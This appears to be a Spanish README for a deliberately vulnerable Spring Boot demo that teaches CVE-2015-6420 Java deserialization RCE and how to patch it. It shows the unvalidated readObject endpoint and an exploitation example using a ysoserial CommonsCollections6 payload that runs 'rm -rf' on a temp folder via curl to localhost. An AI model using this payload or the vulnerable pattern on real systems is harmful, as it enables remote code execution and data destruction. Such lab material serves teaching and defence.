# demo-app-vulnerable

**Aplicación web vulnerable** que demuestra CVE-2015-6420 (Apache Commons Collections RCE).

## ⚠️ Advertencia

Esta aplicación **está deliberadamente vulnerable** para fines educativos. No desplegar en producción.

## Descripción

Aplicación Spring Boot con Java 21 que:
- 📡 Expone un endpoint HTTP `/api/deserialize`
- 🔓 Deserializa datos binarios **sin validación** (VULNERABLE)
- 💥 Ejecuta código arbitrario si recibe un payload malicioso
- 📦 Hereda `commons-collections:3.2.1` del BOM (VULNERABLE)

## Estructura

```
demo-app-vulnerable/
├── pom.xml                              ← Importa BOM y utilities
├── README.md
├── src/main/java/com/demo/app/
│   ├── Application.java                 ← Inicia Spring Boot
│   └── VulnerableController.java        ← Endpoint vulnerable
└── src/main/resources/
    └── application.properties           ← Configuración Spring
```

## Requisitos

- Java 21 (JDK)
- Maven 3.8+
- `ysoserial` (para generar payloads)

## Compilar

```bash
mvn clean package spring-boot:repackage
```

Genera: `target/demo-app-vulnerable-1.0.0.jar`

## Ejecutar

```bash
java -jar target/demo-app-vulnerable-1.0.0.jar
```

Salida esperada:

```
  .   ____          _            __ _ _
 /\\ / ___'_ __ _ _(_)_ __  __ _ \ \ \ \
( ( )\___ | '_ | '_| | '_ \/ _` | \ \ \ \
 \\/  ___)| |_)| | | | | || (_| |  ) ) ) )
  '  |____| .__|_| |_|_| |_|\__, | / / / /
 =========|_|==============|___/=/_/_/_/
 :: Spring Boot ::        (v3.3.0)

2026-05-25 09:45:00.000 INFO  : Started Application in 2.345 seconds
```

Servidor disponible en: `http://localhost:8080`

## Endpoints

### Health Check

```bash
curl http://localhost:8080/api/health
```

Respuesta:

```json
"App is running"
```

### Endpoint Vulnerable (PELIGROSO)

```bash
POST /api/deserialize
Content-Type: application/octet-stream

[datos binarios del payload]
```

## Vulnerabilidad: CVE-2015-6420

### ¿Qué es?

Deserialización insegura de objetos Java. El endpoint:

```java
@PostMapping("/api/deserialize")
public ResponseEntity<?> deserializeData(@RequestBody byte[] data) {
    ByteArrayInputStream bais = new ByteArrayInputStream(data);
    ObjectInputStream ois = new ObjectInputStream(bais);
    
    // VULNERABLE: Deserializar sin validar
    Object obj = ois.readObject();  // ← Aquí ocurre la explotación
    
    return ResponseEntity.ok("Deserialized: " + obj.getClass().getName());
}
```

### ¿Por qué es peligroso?

1. **Gadget Chain:** Apache Commons Collections 3.2.1 tiene "gadgets" (clases que ejecutan código)
2. **Payload malicioso:** `ysoserial` crea un objeto serializado que encadena estos gadgets
3. **RCE:** Al deserializar, se ejecutan automáticamente los gadgets → RCE

### Ejemplo de Explotación

```bash
# 1. Generar payload que borra /tmp/vulnerable_data/*
java -jar /tmp/ysoserial-all.jar CommonsCollections6 'rm -rf /tmp/vulnerable_data/*' > /tmp/payload.bin

# 2. Enviar al endpoint vulnerable
curl -X POST \
  -H "Content-Type: application/octet-stream" \
  --data-binary @/tmp/payload.bin \
  http://localhost:8080/api/deserialize

# 3. Comando se ejecuta en el servidor
# La carpeta /tmp/vulnerable_data/ es BORRADA
```

## Demostración Paso a Paso

Ver: [DEMO_README.md](../DEMO_README.md)

O ejecutar el script automatizado:

```bash
../exploit.sh
```

## Actualizar a versión segura

### Paso 1: Actualizar el BOM

En `demo-bom-jakarta/pom.xml`:

```xml
<!-- CAMBIAR -->
<commons.collections.version>3.2.1</commons.collections.version>

<!-- POR -->
<commons.collections.version>4.0</commons.collections.version>
```

### Paso 2: Recompilar en orden

```bash
# 1. Actualizar BOM
cd ../demo-bom-jakarta
mvn clean install
cd ..

# 2. Utilities se actualiza automáticamente
cd demo-utilities-jakarta
mvn clean install
cd ..

# 3. App vulnerable
cd demo-app-vulnerable
mvn clean package spring-boot:repackage
cd ..
```

### Paso 3: Verificar que está parcheado

```bash
# Iniciar app nuevamente
java -jar target/demo-app-vulnerable-1.0.0.jar

# Enviar el mismo payload
curl -X POST \
  -H "Content-Type: application/octet-stream" \
  --data-binary @/tmp/payload.bin \
  http://localhost:8080/api/deserialize

# Resultado esperado:
# Error 500 - La deserialización es rechazada por Commons Collections 4.0+
```

## Verificar dependencias

Ver qué versiones están siendo usadas:

```bash
mvn dependency:tree | grep commons-collections
```

Salida (vulnerable):

```
[INFO] |  +- commons-collections:commons-collections:jar:3.2.1:compile
```

Salida (seguro):

```
[INFO] |  +- commons-collections:commons-collections:jar:4.0:compile
```

## Dependabot

Cuando esté en GitHub:

1. Dependabot analizará el árbol de dependencias
2. Encontrará `commons-collections:3.2.1` como vulnerable
3. Abrirá automáticamente un PR con:
   - Cambio sugerido en `demo-bom-jakarta`
   - Actualización transitividad en `demo-utilities-jakarta`
   - Actualización en este proyecto
4. Mostrará información del CVE-2015-6420

## Arquitectura de Transitividad

```
demo-app-vulnerable
  ├── depends on: demo-utilities-jakarta
  │   ├── imports BOM: demo-bom-jakarta
  │   │   └── defines: commons-collections:3.2.1 ← VULNERABLE
  │   └── depends on: commons-collections (versión del BOM)
  └── import BOM: demo-bom-jakarta (mismo BOM)
```

Cuando actualices el BOM a `commons-collections:4.0`, todos los proyectos automáticamente obtienen la nueva versión.

## Código Relevante

### VulnerableController.java

- **Línea vulnerable:** `Object obj = ois.readObject();`
- **Por qué:** Deserializa sin validación ni filtros
- **Fix:** Usar `ObjectInputFilter` o validar explícitamente

## Recursos

- [CVE-2015-6420 - Apache Commons Collections RCE](https://nvd.nist.gov/vuln/detail/CVE-2015-6420)
- [ysoserial - Generador de payloads](https://github.com/frohoff/ysoserial)
- [Java Serialization Security Guide](https://cheatsheetseries.owasp.org/cheatsheets/Deserialization_Cheat_Sheet.html)
- [Spring Boot Security](https://spring.io/projects/spring-security)

## Logs útiles

Ver en tiempo real qué se está deserializando:

```bash
# Iniciar con debug
java -Dlogging.level.com.demo=DEBUG \
     -jar target/demo-app-vulnerable-1.0.0.jar
```

## FAQ

**P: ¿Por qué este código es vulnerable y no otros?**

R: Porque:
1. No hay validación de clases permitidas
2. Commons Collections 3.2.1 contiene gadgets explotables
3. `ObjectInputStream.readObject()` ejecuta constructores y métodos automáticamente

**P: ¿Es fácil de explotar?**

R: Sí. Solo necesitas:
- Una herramienta como `ysoserial`
- Acceso al endpoint
- Un comando a ejecutar

**P: ¿Cómo se previene?**

R:
- Actualizar Commons Collections a 4.0+
- Usar `ObjectInputFilter` (Java 9+)
- No deserializar datos untrusted
- Usar alternativas como JSON

---

**Parte de:** Demo educativa de vulnerabilidades CVE-2015-6420
